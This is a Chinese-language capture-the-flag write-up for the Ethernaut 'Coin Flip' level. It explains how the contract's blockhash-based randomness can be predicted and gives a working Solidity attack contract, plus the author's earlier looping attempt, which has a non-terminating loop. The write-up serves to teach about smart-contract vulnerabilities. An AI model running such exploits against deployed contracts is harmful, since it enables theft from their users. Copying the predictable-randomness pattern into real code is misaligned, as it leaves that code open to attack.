# 03-Coin Flip

小结: 逻辑漏洞
日期: 15/08/2024
难易: 简单

# 问题描述

This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

# 攻击思路

代码是通过`flip`函数，带上true或者false的变量，去猜。

通过代码`coinFlip = blockValue / FACTOR;`可以知道结果其实是通过`blockValue`和`Factor`来确定的。

- `Factor`是一个确定的值
- `blockValue`跟`block.number`强相关

写一个攻击合约`AttackCoinFlip`，部署在相同的链上，然后输入相同的`FACTOR`，这样`colinFlip`和`coinFlip`合约相同，我们可以先知道结果，然后再去猜，百发百中。

## 细节思考

- 需要保障攻击合约和victim合约在同一个`block.number`，手动操作的话，还是有概率发生拿到结果但是还没有猜测的时候，number已经加一
- 看了一下代码，应该是通过consecutiveWins到10即可，无所谓是谁攻击，所以我们可以代码自动攻击，拿到结果直接进行预测。
    - 这仅仅是针对解题，当然实际场景中的攻击就更加无所谓了

## 攻击代码

下面的代码和源代码是同一个文件

```solidity
pragma solidity ^0.8.0;

contract AttackCoinFlip{
    CoinFlip victim;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _victim){  
        victim = CoinFlip(_victim);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        victim.flip(side);
    } 
}
```

![image.png](03-Coin%20Flip/image.png)

# 小白的思考

下面是我刚开始写的代码，甚至用到了while loop

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
} 

contract AttackCoinFlip{
    ICoinFlip victim;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 blockValue;

    constructor(address _victim){
        victim = ICoinFlip(_victim);
    }

    function attack() public {
        uint256 winCounts = victim.consecutiveWins();
        while (winCounts < 10) {
            blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;
            victim.flip(side);
        }
    }
}
```

- 不用for loop是因为考虑到了连续会触发下面的代码，跑不到10次，但是其实while也会，比较浪费gas

```jsx
        if (lastHash == blockValue) {
            revert();
        }
```

最后还是要手动来一次操作才可以

用while也不是不可以，但是触发太快，得把监控`block.number`也写进去